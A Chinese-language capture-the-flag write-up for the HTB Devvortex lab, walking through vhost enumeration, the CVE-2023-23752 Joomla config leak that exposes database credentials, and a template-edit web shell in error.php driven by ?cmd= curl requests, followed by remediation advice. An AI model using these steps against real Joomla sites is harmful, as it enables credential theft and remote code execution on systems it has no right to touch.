# Devvortex — Writeup

## 范围

本题复现 HTB Devvortex 的 Web 初始访问阶段：通过虚拟主机枚举发现 Joomla 4.2.6，利用 CVE-2023-23752 未授权配置泄露取得管理凭据，登录 Joomla 后使用正常的 Cassiopeia 模板编辑功能修改 PHP 文件，最终以 Web 服务账户 www-data 读取一个 Web Flag。

本平台版本明确限定为 Web-only：不包含 SSH 凭据复用、Linux 用户切换、Apport 或 Root Flag。

## 1. 侦察公开站点

先枚举 HTTP 服务和虚拟主机：

```bash
nmap -sC -sV -p80 <TARGET>
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb'
```

确认主站与开发站点使用不同 Host header，但共享同一个 HTTP 服务：

```bash
curl -i -H 'Host: devvortex.htb' http://<TARGET>/
curl -i -H 'Host: dev.devvortex.htb' http://<TARGET>/administrator/
```

## 2. 识别 Joomla 版本

浏览器访问 Joomla 管理入口，并检查公开的版本清单：

```bash
curl -sS -H 'Host: dev.devvortex.htb' \
  http://<TARGET>/administrator/manifests/files/joomla.xml
```

XML 显示 Joomla 4.2.6。该版本落在 Joomla 官方公告所列 CVE-2023-23752 受影响范围 4.0.0–4.2.7 内；修复版本为 4.2.8。

## 3. 发现未授权配置泄露

检查 Joomla Web Services API：

```bash
curl -i -H 'Host: dev.devvortex.htb' \
  'http://<TARGET>/api/index.php/v1/config/application?public=true'
```

CVE-2023-23752 的访问控制缺陷使未认证请求能够读取本应受保护的配置数据，其中包括数据库连接凭据。检查 JSON 响应中的 password 字段，并记录泄露的凭据。

## 4. 使用凭据进入 Joomla 管理后台

将泄露的凭据用于 Joomla 管理登录。登录后浏览 Site Templates，选择 Cassiopeia 模板并打开其文件列表。

在正常的模板编辑器中打开 error.php。这不是额外的 Joomla 漏洞：管理员本身拥有编辑模板 PHP 文件的权限，保存后的 PHP 文件会由 Web 服务器执行。

## 5. 通过模板编辑获得 Web 执行上下文

在 error.php 文件开头、Joomla 的 `defined('_JEXEC') or die;` 检查之前，插入一个仅用于本地靶场的命令输出处理段。保存后，通过 HTTP 请求该 PHP 文件，验证命令执行身份：

```bash
curl -sS -H 'Host: dev.devvortex.htb' \
  'http://<TARGET>/templates/cassiopeia/error.php?cmd=id%20-un'
```

预期身份为 www-data。随后读取 Web Flag：

```bash
curl -sS -H 'Host: dev.devvortex.htb' \
  'http://<TARGET>/templates/cassiopeia/error.php?cmd=cat%20/home/www-data/user.txt'
```

提交返回的 TTP Flag 即可完成本题。

## 漏洞根因与修复

- CVE-2023-23752：Joomla Web Services 端点的访问控制检查不正确。升级至修复版本，并限制敏感配置不应通过匿名 API 返回。
- 管理后台模板编辑：Super User 可以编辑模板 PHP 文件，这是高权限管理功能。应限制后台访问、启用 MFA、最小化 Super User 账户，并监控模板文件变更。
- Web 服务账户：模板 PHP 代码以 Web 服务身份执行。应确保 Web 进程权限最小化，避免其读取不必要的敏感文件。

## 自动化验收

exploit.py 使用独立 HTTP 客户端完成虚拟主机识别、版本检查、匿名配置泄露、管理员登录、模板编辑、Web 执行身份验证和精确 Flag 回读。测试不使用 SSH、Docker socket、目标文件系统挂载或 docker exec。
